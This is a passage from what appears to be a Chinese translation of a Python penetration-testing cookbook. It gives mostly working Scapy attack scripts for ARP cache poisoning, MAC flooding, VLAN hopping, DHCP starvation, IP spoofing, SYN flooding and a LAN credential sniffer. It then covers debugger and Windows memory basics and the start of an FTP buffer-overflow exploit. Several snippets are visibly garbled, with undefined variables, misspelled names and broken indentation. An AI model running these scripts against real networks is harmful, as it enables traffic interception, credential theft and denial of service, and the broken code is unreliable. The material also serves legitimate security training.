如果输出是`1`，则 IP 转发已启用；如果是`0`，则 IP 转发已禁用。如果已禁用，请按以下方式启用它：

```py
echo 1 > /proc/sys/net/ipv4/ip_forward  
```

# macOS

您可以使用以下命令在 macOS 上启用 IP 转发：

```py
sudo sysctl -w net.inet.ip.forwarding=1  
```

使用以下命令禁用它：

```py
sudo sysctl -w net.inet.ip.forwarding=0  
```

# 如何做...

以下是编写脚本以中毒受害系统的 ARP 缓存的步骤：

1.  创建一个新的`arp-cache-poisoning.py`文件并在编辑器中打开。

1.  导入`scapy`模块：

```py
from scapy.all import *  
```

1.  声明变量。我们也可以从参数中获取这些，或者使用`raw_input()`：

```py
interface = "en0"
gateway_ip = "192.168.1.2"
target_ip = "192.168.1.103"
broadcastMac = "ff:ff:ff:ff:ff:ff"
packet_count = 50  
```

1.  现在定义一个从提供的 IP 获取 MAC ID 的函数：

```py
def getMac(IP):
    ans, unans = srp(Ether(dst=broadcastMac)/ARP(pdst = IP), timeout =2, iface=interface, inter=0.1)
    for send,recive in ans: 
        return r[Ether].src
    return None  
```

1.  现在用`getMac()`方法获取目标和网关的 MAC 地址：

```py
try:
    gateway_mac = getMac(gateway_ip)
    print ("Gateway MAC :" + gateway_mac)
except:
    print ("Failed to get gateway MAC. Exiting.")
    sys.exit(0)
try:
    target_mac = getMac(target_ip)
    print ("Target MAC :" + target_mac)
except:
    print ("Failed to get target MAC. Exiting.")
    sys.exit(0)  
```

1.  定义中毒目标 ARP 缓存的函数：

```py
def poison(gateway_ip,gateway_mac,target_ip,target_mac):
    targetPacket = ARP()
    targetPacket.op = 2
    targetPacket.psrc = gateway_ip
    targetPacket.pdst = target_ip
    targetPacket.hwdst= target_mac
    gatewayPacket = ARP()
    gatewayPacket.op = 2
    gatewayPacket.psrc = target_ip
    gatewayPacket.pdst = gateway_ip
    gatewayPacket.hwdst= gateway_mac
    while True:
       try:
           targetPacket.show()
           send(targetPacket)
           gatewayPacket.show()
           send(gatewayPacket)
           time.sleep(2)
         except KeyboardInterrupt:                
 restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            sys.exit(0)
       sys.exit(0)
       return
```

在这里，我们发送两种类型的数据包--一种是发送到目标机器，另一种是发送到网关。前两个块定义了这些数据包。目标数据包将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00055.jpeg)

`网关`数据包将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00056.jpeg)

1.  现在创建一个函数将中毒的缓存重置为正常状态：

```py
def restore(gateway_ip,gateway_mac,target_ip,target_mac):
    print("Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=100)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=100)
    print("Target Restored...")
    sys.exit(0)
```

1.  然后，我们可以开始发送数据包：

```py
try:
    poison(gateway_ip, gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
    restore(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)  
```

1.  以所需的权限运行脚本：

```py
sudo python3 arp-cache-poisoning.py  
```

# MAC 洪泛

我们可以通过在网络上传送随机的以太网流量来填充路由器的 MAC 地址存储。这可能导致交换机故障，并可能开始将所有网络流量发送给连接到路由器的所有人，或者可能失败。

# 如何做...

以下是淹没路由器 MAC 地址存储的步骤：

1.  创建一个`mac-flooder.py`文件并在您的编辑器中打开。

1.  导入所需的模块：

```py
import sys
from scapy.all import *  
```

1.  定义要淹没的`interface`。我们也可以从参数中获取它：

```py
interface = "en0"  
```

1.  创建具有随机 MAC ID 和随机 IP 的数据包：

```py
pkt = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*")) / \
        IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*")) / \
        ICMP()

```

数据包结构将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00057.jpeg)

1.  最后，在无限循环中发送数据包：

```py
try:
    while True:
        sendp(pkt, iface=interface)
except KeyboardInterrupt:   
    print("Exiting.. ")   
    sys.exit(0)  
```

1.  现在以所需的权限运行文件：

```py
sudo python3 mac-flooder.py  
```

# VLAN 跳跃 

VLAN 跳跃是一种攻击类型，攻击者能够将一个 VLAN 的流量发送到另一个 VLAN。我们可以用两种方法实现这一点：双标签和交换机欺骗。为了创建双标签攻击，攻击者发送一个带有两个**802.1Q**标签的数据包--内部 VLAN 标签是我们计划到达的 VLAN，外层是当前的 VLAN。

# 如何做...

以下是模拟简单的 VLAN 跳跃攻击的步骤：

1.  创建一个`vlan-hopping.py`文件并在您的编辑器中打开。

1.  导入模块并设置变量：

```py
import timefrom scapy.all 
import *iface = "en0"
our_vlan = 1
target_vlan = 2
target_ip = '192.168.1.2'  
```

1.  使用两个 802.1Q 标签制作数据包：

```py
ether = Ether()
dot1q1 = Dot1Q(vlan=our_vlan)   # vlan tag 1 
dot1q2 = Dot1Q(vlan=target_vlan) # vlan tag 2
ip = IP(dst=target_ip)
icmp = ICMP()
packet = ether/dot1q1/dot1q2/ip/icmp  
```

数据包将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00058.jpeg)

1.  现在，在无限循环中发送这些数据包：

```py
try:
    while True:
        sendp(packet, iface=iface)
        time.sleep(10)
  except KeyboardInterrupt:
     print("Exiting.. ")
     sys.exit(0)  
```

1.  以所需的权限运行脚本：

```py
sudo python3 vlan-hopping.py  
```

# ARP 欺骗跨 VLAN 跳跃

由于 VLAN 限制广播流量到相同的 VLAN，因此我们为每个数据包打上我们的 VLAN 标记，并额外添加目标 VLAN 的标记。

# 如何做...

以下是模拟 ARP 欺骗攻击跨 VLAN 跳跃的步骤：

1.  创建一个新的`arp-spoofing-over-vlan.py`文件并在您的编辑器中打开。

1.  导入模块并设置变量：

```py
import time
from scapy.all import *
iface = "en0"
target_ip = '192.168.1.2'
fake_ip = '192.168.1.3'
fake_mac = 'c0:d3:de:ad:be:ef'
our_vlan = 1
target_vlan = 2  
```

1.  创建具有两个 802.1Q 标签的 ARP 数据包：

```py
ether = Ether()
dot1q1 = Dot1Q(vlan=our_vlan)
dot1q2 = Dot1Q(vlan=target_vlan)
arp = ARP(hwsrc=fake_mac, pdst=target_ip, psrc=fake_ip, op="is-at")
packet = ether/dot1q1/dot1q2/arp  
```

这是一个带有两个 802.1Q 标签和 ARP 层的数据包：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00059.jpeg)

1.  在无限循环中发送数据包：

```py
try:
    while True:
       sendp(packet, iface=iface)
         time.sleep(10)
  except KeyboardInterrupt:
      print("Exiting.. ")
      sys.exit(0)  
```

1.  以所需的权限运行脚本：

```py
sudo python3 arp-spoofing-over-vlan.py  
```

# DHCP 饥饿

DHCP 是帮助为 LAN 分配客户端 IP 地址的协议。分配 DHCP 的过程包括四个步骤--DHCPDiscover、DHCPOffer、DHCPRequest 和 DHCP ACK。

DHCPDiscover 是客户端在 LAN 中广播以查找可以为客户端提供 IP 的 DHCP 服务器的第一步。然后服务器将以单播 DHCPOffer 响应，其中提供可能的 IP。然后，客户端将向所有网络广播 DHCPRequest 与 IP，最后服务器将以 DHCP ACK 或 DHCP NAK 响应。ACK 表示成功的 DHCP 过程，而 NAK 表示 IP 不可用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00060.jpeg)

DHCP 服务器将 IP 信息存储到 MAC 绑定。如果我们从 DHCP 服务器请求太多 IP，其他合法客户端将无法获得 IP 连接。这被称为**DHCP 饥饿攻击**。在这个示例中，我们将攻击这个过程的第三步。发送 DHCP 请求后，服务器将为客户端分配请求的 IP。这可以用来攻击特定范围的 IP。

# 如何做...

让我们尝试编写一个脚本来使网络中的 DHCP 饥饿：

1.  创建一个`dhcp-starvation.py`文件并在您的编辑器中打开。

1.  导入所需的模块：

```py
from scapy.all import *
from time import sleep
from threading import Thread 
```

我们需要`Scapy`来制作数据包，并且需要`threading`模块来执行脚本的线程化

1.  现在，定义变量：

```py
mac = [""]
ip = []  
```

1.  现在我们可以定义回调函数来处理捕获的 DHCP 数据包：

```py
def callback_dhcp_handle(pkt):
    if pkt.haslayer(DHCP):
       if pkt[DHCP].options[0][1]==5 and pkt[IP].dst != "192.168.1.38":
          ip.append(pkt[IP].dst)
             print (str(pkt[IP].dst)+" registered")
          elif pkt[DHCP].options[0][1]==6:
              print ("NAK received")  
```

这个函数被调用来处理嗅探器接收到的每个数据包

1.  现在我们必须创建另一个函数来配置嗅探器。这个函数被线程调用：

```py
def sniff_udp_packets():
    sniff(filter="udp and (port 67 or port 68)",
          prn=callback_dhcp_handle,
          store=0)  
```

这将开始嗅探到端口`67`和`68`的 UDP 数据包

1.  现在我们可以创建一个 DHCPRequest 数据包并将其发送到我们计划饥饿的 DHCP 服务器：

```py
def occupy_IP():
    for i in range(250):
        requested_addr = "192.168.1."+str(2+i)
        if requested_addr in ip:
             continue
          src_mac = ""
          while src_mac in mac:
              src_mac = RandMAC()
         mac.append(src_mac)    
          pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
          pkt /= IP(src="img/0.0.0.0", dst="255.255.255.255")
          pkt /= UDP(sport=68, dport=67)
          pkt /= BOOTP(chaddr="\x00\x00\x00\x00\x00\x00",xid=0x10000000)
          pkt /= DHCP(options=[("message-type", "request"),
                               ("requested_addr", requested_addr),
                              ("server_id", "192.168.1.1"),
                               "end"])
          sendp(pkt)
          print ("Trying to occupy "+requested_addr)
          sleep(0.2)  # interval to avoid congestion and packet loss 
```

这将首先在指定范围内生成一个 IP 地址。此外，它将为数据包创建一个随机的 MAC 地址。然后，它将使用生成的 IP 地址和 MAC 地址来创建一个 DHCP 请求数据包。然后，它将发送数据包。生成的数据包将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00061.jpeg)

1.  现在我们可以启动线程，尝试在 DHCP 服务器中占用 IP 地址：

```py
def main():
    thread = Thread(target=sniff_udp_packets)
    thread.start()
    print ("Starting DHCP starvation...")
   while len(ip) < 100: 
    occupy_IP()
    print ("Targeted IP address starved")   
  main()

```

1.  现在，以所需的权限运行脚本。


# 第十一章：TCP/IP 攻击

在本章中，我们将涵盖以下内容：

+   IP 欺骗

+   SYN 洪泛

+   使用 Python 在局域网中进行密码嗅探

# 介绍

传输层是提供数据传递、流量控制和错误恢复服务的层。两个主要的传输层协议是 TCP 和 UDP。在本章中，我们将讨论传输层中一些常见的攻击。

# IP 欺骗

使用 Scapy，我们可以简单地制作数据包并发送它们。因此，如果我们伪造源地址并发送它，网络将接受并将响应返回到伪造的地址。现在，我们可以创建一个脚本来使用伪造的 IP 对系统进行 ping。

# 操作步骤...

以下是创建发送伪造 IP 的 ping 请求脚本的步骤：

1.  创建一个`ip-spoof-ping.py`文件并在编辑器中打开它。

1.  然后，我们必须导入所需的模块：

```py
from scapy.all import *  
```

1.  现在为脚本声明变量：

```py
iface = "en0"
fake_ip = '192.168.1.3'
destination_ip = '192.168.1.5'  
```

1.  创建一个函数来发送 ICMP 数据包：

```py
def ping(source, destination, iface):
    pkt = IP(src=source,dst=destination)/ICMP()
    srloop(IP(src=source,dst=destination)/ICMP(), iface=iface)  
```

这将创建以下数据包并开始发送/接收循环：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00062.jpeg)

1.  开始发送伪造的数据包：

```py
try:
    print ("Starting Ping")
    ping(fake_ip,destination_ip,iface)    
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  现在以所需的权限运行脚本：

```py
sudo python3 ip-spoof-ping.py  
```

1.  现在我们可以尝试发送伪造的 DNS 查询。为此，创建另一个名为`dnsQuery()`的函数。

```py
def dnsQuery(source, destination, iface):
    pkt =IP(dst=destination,src=source)/UDP()/DNS(rd=1,qd=DNSQR(qname="example.com"))     sr1(pkt)  
```

这将创建以下数据包，并开始在发送/接收循环中发送：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00063.jpeg)

1.  然后通过调用此方法发送 DNS 查询：

```py
try: 
    print ("Starting Ping")
    dnsQuery(fake_ip,dns_destination,iface)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  如果我们可以监视受害者的`tcpdump`，我们可以看到 DNS 响应。

# SYN 洪泛

SYN 洪泛是一种使服务对合法用户不可用的 DOS 攻击类型。SYN 洪泛攻击利用了 TCP 协议的*三次握手*，其中客户端发送 TCP SYN 数据包以开始与服务器的连接，服务器回复 TCP SYN-ACK 数据包。然后，在正常操作中，客户端将发送一个 ACK 数据包，然后是数据。这将保持连接处于`SYN_RECV`状态。但是，如果客户端不用 ACK 数据包回应，连接将处于半开放状态。

如果多个攻击者或系统向目标服务器打开了许多这样的半开放连接，它可能填满服务器的 SYN 缓冲区，并且可能停止接收更多的 SYN 数据包，从而导致**拒绝服务**（DoS）攻击：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00064.jpeg)

我们可以使用 Scapy 生成 SYN 洪泛数据包进行测试。

# 操作步骤...

以下是创建生成 SYN 洪泛攻击脚本的步骤：

1.  创建一个`syn-flooding.py`文件并在编辑器中打开它。

1.  然后，我们必须导入所需的模块：

```py
from scapy.all import *  
```

1.  现在，声明变量：

```py
iface = "en0"
destination_ip = '192.168.1.5'  
```

1.  定义一个函数来创建和发送 SYN 洪泛数据包：

```py
def synFlood(destination, iface):
    print ("Starting SYN Flood")       packet=IP(dst=destination,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
    ans,unans=srloop(paket, iface=iface, inter=0.3,retry=2,timeout=4)
    ans.summary()
    unans.summary()  
```

在这里，随机值用于设置数据包中的 TTL 和 ID。这将有助于混淆服务器中存在的任何入侵检测系统。此外，源端口是由`randshort()`函数创建的随机值。

这是一个创建的示例数据包：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00065.jpeg)

1.  现在发送数据包：

```py
try:
    synFlood(destination_ip, iface)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  以所需的权限运行此脚本：

```py
sudo python3 syn-flooding.py  
```

# 使用 Python 在局域网中进行密码嗅探

我们已经学习了如何在之前的示例中使用 Scapy 来嗅探数据包。现在我们可以使用 Scapy 来嗅探和提取数据包中的内容。这可以用来获取许多协议的细节。我们可以尝试从这些嗅探到的数据包中获取凭据。我们可以将这个嗅探器绑定到我们的 ARP 欺骗攻击中，以从网络上的其他计算机获取详细信息。

# 操作步骤...

以下是编写局域网密码嗅探器的步骤：

1.  创建一个`pass-sniffer.py`文件并在编辑器中打开它。

1.  导入所需的模块：

```py
from scapy.all import *
from urllib import parse  
```

1.  现在为接口声明变量：

```py
iface = "en0"
conf.verb=0  
```

1.  创建一个方法来检查嗅探到的内容中的用户名和密码：

```py
def get_login_pass(body):    
    user = None
    passwd = None    
    userfields = ['log','login', 'wpname', 'ahd_username', 
'unickname', 'nickname', 'user', 'user_name',
    'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
    'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
    'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
    'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
    'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
    'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']    
     for login in userfields:
          login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
          if login_re:
              user = login_re.group()
      for passfield in passfields:
          pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
         if pass_re:
             passwd = pass_re.group()    
     if user and passwd:
         return (user, passwd)  
```

在这里，我们使用数据中的关键字进行搜索，并提取用户名和密码（如果存在）。

1.  现在，创建一个函数来解析嗅探到的数据包：

```py
def pkt_parser(pkt):    
    if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
           pass       
      if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
          pkt[TCP].payload
          mail_packet = str(pkt[TCP].payload)    
          body = str(pkt[TCP].payload)
          user_passwd = get_login_pass(body)
          if user_passwd != None:
              print(parse.unquote(user_passwd[0]).encode("utf8"))
              print(parse.unquote( user_passwd[1]).encode("utf8"))
      else:
          pass  
```

首先，我们将忽略没有 IP 层的原始数据包。然后我们获取 IP 层并提取有效载荷，并将其传递给`get_login_pass()`方法来提取凭据。

1.  现在，开始在提供的接口中嗅探数据包：

```py
try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  现在，以所需的权限运行脚本：

```py
sudo python3 pass-sniffer.py  
```

1.  我们可以通过少量修改来更新这个脚本以提取 FTP 凭据：

```py
if pkt[TCP].dport == 21 or pkt[TCP].sport ==21:
   data = pkt[Raw].load
   print(str(data))  
```

这将打印 FTP 数据。我们可以对其进行正则匹配以获取用户名和密码。


# 第十二章：利用开发简介

在本章中，我们将涵盖以下配方：

+   CPU 寄存器

+   内存转储

+   CPU 指令

# 介绍

Python 对于创建简单的原型代码来测试利用非常有帮助。在本章中，我们可以学习利用开发的基础知识，这可能有助于您修复损坏的利用，或者从头开始构建自己的利用。

# CPU 寄存器

CPU 寄存器，或处理器寄存器，是处理器中一小组数据存储位置之一，可以存储指令、存储地址或任何数据。寄存器应能够存储指令。寄存器是最快的计算机内存，用于加快计算机操作。

# 准备工作

在进行利用开发之前，您需要对寄存器有一个基本的了解。为了理解，让我们考虑寄存器主要有两种形式，通用寄存器和特殊目的寄存器。

# 通用寄存器

通用寄存器用于存储程序执行过程中的中间结果和运行数学运算。四个通用寄存器是 EAX、EBX、ECX 和 EDX：

+   EAX（累加器寄存器）：用于基本数学运算和返回函数的值。

+   EBX: 这用于根据需要进行名义存储。

+   ECX（计数器寄存器）：用于循环遍历函数和迭代。它也可以用于一般存储。

+   EDX（数据寄存器）：用于高级数学运算，如乘法和除法。它还在运行程序时存储函数变量。

# 特殊目的寄存器

特殊目的寄存器用于处理索引和指向。这些在编写利用时非常重要，因为我们将尝试操纵和覆盖这些寄存器中的数据。主要的特殊目的寄存器是 EBP、EDI、EIP 和 ESP：

+   EBP: 这个指针寄存器指示堆栈底部的位置。因此，这将指向堆栈顶部，或者在我们启动函数时设置为旧的指针值，因为这是开始。

+   EDI: 这是目的地索引寄存器，用于指向函数的指针。

+   EIP: 指令指针寄存器用于存储 CPU 要执行的下一条指令。因此，这对于利用编写非常重要，因为如果我们可以编辑这个，我们就可以控制下一条指令。此外，如果我们可以覆盖这个 EIP，这意味着程序本身已经失败。

+   ESP: 当堆栈指针指示堆栈的当前顶部（最低内存地址）时。随着程序运行，它会更新，因为项目从堆栈顶部移除。加载新函数时，它会返回到顶部位置。如果我们需要访问堆栈内存，我们可以使用 ESP。

在运行程序时查看寄存器，我们需要调试器，在您的系统中安装调试器。对于调试 Windows 程序，我们可以使用 Immunity Debugger，对于 Linux 和 Mac，我们可以使用`pwngdb`。

您可以从这里下载并安装 Immunity Debugger：[`www.immunityinc.com/products/debugger/`](https://www.immunityinc.com/products/debugger/)。

要安装`pwndbg`，请从 Git 存储库获取代码并运行安装脚本：

```py
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh  
```

# 如何做…

我们可以在调试器工具中执行一些快速任务，以更好地理解这些寄存器。

1.  在运行程序时查看寄存器，我们需要使用调试器。因此，在 Windows 机器上打开 Immunity Debugger 中的可执行文件。

1.  然后加载程序以在 Immunity Debugger 中进行分析。从菜单中转到文件|打开，并选择要监视的应用程序。

1.  它将以调试模式打开应用程序并打印出当前的详细信息。右上角的框将显示寄存器的详细信息。Immunity 中的寄存器窗格

调试器如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00066.gif)

1.  对于 Linux 和 macOS，在安装`pwndbg`之后，我们可以使用以下命令在`pwndbg`中打开应用程序：

```py
>> gdb ./app  
```

这将在调试器中打开应用程序`app`

1.  现在我们可以在调试模式下运行应用程序，并设置断点：

```py
pwndbg> break 5
pwndbg> run  
```

这将运行应用程序并在第`5`行处中断

1.  现在我们可以使用以下命令查看当前状态的寄存器：

```py
pwndbg>info registers    
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00067.jpeg)

如果可执行文件是 64 位的，则寄存器将以`r`开头。以`e`开头是无效的。

# 内存转储

我们可以使用内存转储轻松查看内存位置的内容。我们可以使用 Immunity Debugger 或`pwndbg`来实现这一点。

# 如何做…

按照以下步骤更好地理解内存转储：

1.  在 Immunity Debugger 中打开一个应用程序。

1.  如果要查看 ESI 寄存器中的内存转储，并右键单击地址，选择转到转储选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00068.jpeg)

1.  这将更新左下角的内存转储窗口。Immunity Debugger 中的内存转储窗口如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00069.gif)

1.  使用`pwndbg`，我们可以使用`hexdump`命令获取内存转储。为此，在`gdb`中加载应用程序并在断点处运行它：

```py
pwndbg> break 5
pwndbg> run  
```

1.  现在要查看 RSI 寄存器中的内存转储，请运行以下命令：

```py
pwndbg> hexdump $rsi  
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00070.jpeg)

# CPU 指令

当应用程序用高级语言编写并编译时，语言指令将被转换为相应的汇编语言。这是机器可以理解的代码。通过调试器，我们可以查看每个汇编指令。

# 如何做…

按照以下步骤了解调试器的用法：

1.  在 Immunity Debugger 中打开一个应用程序。

1.  我们可以在 Immunity Debugger 的左上角窗格中查看操作码。

1.  我们可以逐步执行指令，并通过按下*F7*来查看结果：

以下是指令窗格的外观：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00071.jpeg)

这将更新右上角窗格中相应的寄存器。通过这样，我们可以在 Immunity Debugger 中跟踪每个 CPU 指令的执行。

在`pwndbg`的情况下，我们可以使用`entry`命令在入口点执行：

```py
pwndbg> entry  
```

这将显示上下文屏幕。

1.  我们可以使用`nearpc`命令查看断点附近的操作码：

```py
pwndbg> nearpc  
```

输出将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00072.jpeg)

1.  我们可以使用`stepi`命令逐步执行指令：

```py
pwndbg> stepi  
```

这将执行一条机器指令，然后停止并返回到调试器。

通过这样，我们可以逐步分析指令。


# 第十三章：Windows 利用开发

在本章中，我们将涵盖以下配方：

+   Windows 内存布局

+   使用保存的返回指针覆盖的缓冲区溢出攻击

+   结构化异常处理（SEH）

+   蛋猎手

# 介绍

本章将介绍一些基于 Windows 的漏洞以及使用 Python 的利用技术。利用开发任务的解决方案是用我们的指令替换程序指令，以操纵应用程序行为。我们将使用 Immunity Debugger 来调试应用程序。由于受害机器将是 Windows 机器，我们需要一台安装了 Windows XP 操作系统的机器。我们使用旧版 XP 以便于利用，并且具有漏洞的示例应用程序将在 XP 中运行。

# Windows 内存布局

Windows 操作系统内存有许多部分，可以被视为高级组件。为了编写利用并利用有漏洞的程序，我们必须了解内存结构及其各个部分。

# 准备工作

在开始编写利用脚本之前，我们必须了解 Windows 内存布局的结构。

让我们来看一下可执行文件的内存结构：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00073.gif)

由于在大多数利用中我们使用堆栈和堆，我们可以从这些开始。

# 堆栈

堆栈用于有序的短期本地存储。应用程序中的每个线程都有一个堆栈。当调用线程或函数时，为其分配一个具有固定大小的唯一堆栈。堆栈的大小在应用程序或线程启动时定义。此堆栈在函数或线程完成时被销毁。堆栈主要用于存储局部变量、保存函数返回指针、函数参数异常处理程序记录等。

堆栈从堆栈底部到顶部构建数据，从高内存地址到低内存地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00074.jpeg)

# 堆

堆是用于动态分配内存的。当应用程序不知道将接收或处理的数据时，堆将用于存储以无序方式分配的全局变量和值。堆仅在应用程序终止时才被释放。

堆的增长与堆栈相反。它从较低的地址增长到较高的地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00075.jpeg)

# 程序映像和动态链接库

程序映像是实际可执行文件存储在内存中的位置。可执行文件将以**可移植可执行文件**（**PE**）格式存在，并包括可执行文件和 DLL。在这个部分中，定义了一些项目，如 PE 头、`.text`、`.rdata`、`.data`等。PE 头定义了可执行文件的其余部分的头信息，`.text`包括代码段。`.rdata`是只读数据段，`.rsrc`是存储可执行文件的资源，如图标、菜单和字体的部分。

# 进程环境块（PEB）

当我们运行一个应用程序时，该可执行文件的一个实例将作为一个进程运行，并提供运行该应用程序所需的资源。存储运行进程的非内核组件的进程属性是 PEB。此外，PEB 驻留在用户可访问的内存中。

有关 PEB 结构的更多详细信息，请访问此链接：[`msdn.microsoft.com/en-us/library/windows/desktop/aa813706(v=vs.85).aspx`](https://msdn.microsoft.com/en-us/library/windows/desktop/aa813706(v=vs.85).aspx)

# 线程环境块（TEB）

一些进程可能有一个或多个线程。在这种情况下，每个进程都从一个单一的主线程开始，并在需要时创建更多的附加线程。此外，所有这些线程共享相同的虚拟地址。每个线程都有自己的资源，包括异常处理程序、本地存储等。因此，就像 PEB 一样，每个线程都有 TEB。TEB 也驻留在进程地址空间中。

您可以在以下文章中了解有关进程和线程的更多信息：[`msdn.microsoft.com/en-us/library/windows/desktop/ms681917(v=vs.85).aspx`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681917(v=vs.85).aspx) 此外，有关 TEB 结构的更多信息可以在此处找到：[`msdn.microsoft.com/en-us/library/windows/desktop/ms686708(v=vs.85).aspx`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686708(v=vs.85).aspx)

我们需要一个安装了 Immunity Debugger 的 Windows XP 机器来分析示例应用程序。

# 如何做到...

以下是了解 Immunity Debugger 基本用法的步骤：

1.  在 Windows 机器中打开 Immunity Debugger。

1.  然后加载一个要在 Immunity Debugger 中分析的程序。从菜单中选择文件 | 打开并选择要监视的应用程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00076.jpeg)

1.  我们可以通过打开内存映射来查看内存映射。您可以从菜单查看 | 内存中打开它，或者按下*Alt* + *M*键：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00077.jpeg)

这将打开以下窗格：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00078.gif)

这是在 Immunity Debugger 中打开的应用程序的内存映射。这包括所有堆栈、堆、DLL 和可执行文件。

您可以按以下方式查看堆栈：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00079.gif)

DLLs 可以被识别如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00080.gif)

程序图像及其内容将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00081.gif)

DLLs、TEB 和 PEB 将被识别如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00082.gif)

1.  我们可以通过右键单击地址并选择转储选项来获取 PEB 和 TEB 的内存转储：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00083.gif)

# 使用保存的返回指针覆盖的缓冲区溢出

在本教程中，我们将讨论利用具有缓冲区溢出漏洞和保存的返回指针覆盖的应用程序。

# 做好准备

我们可以使用**FreeflotFTP**作为易受攻击的应用程序。您可以从以下网址获取该应用程序：[`rejahrehim.com/assets/sample-package/ftp_server_sample.zip`](https://rejahrehim.com/assets/sample-package/ftp_server_sample.zip)。

易受攻击的机器环境是 Windows XP。因此在真实或虚拟环境中运行 Windows XP 并在其中安装 Immunity Debugger。

# 安装 Mona

我们需要安装 Mona，这是 Immunity Debugger 的`pycommand`模块。为此，请从以下网址下载`mona.py`：[`github.com/corelan/mona`](https://github.com/corelan/mona)。

然后，将`mona.py`添加到`Immunity Debugger`应用程序文件夹内的`pyCommands`文件夹中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00084.jpeg)

# 如何做到...

按照以下步骤创建缓冲区溢出攻击的利用：

1.  在 Windows 机器上，启动 Immunity Debugger 并在其中打开易受攻击的应用程序。

1.  由于它是一个 FTP 服务器，我们可以尝试通过从另一台机器连接来使应用程序崩溃。

1.  我们可以编写一个 Python 脚本来连接到 FTP 服务器。为此，创建一个名为`ftp_exploit.py`的文件并在编辑器中打开它：

```py
#!/usr/bin/python  
import socket 
import sys   
evil = "A"*1000   
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
connect=s.connect(('192.168.1.39',21))   
s.recv(1024) 
s.send('USER anonymous\r\n') 
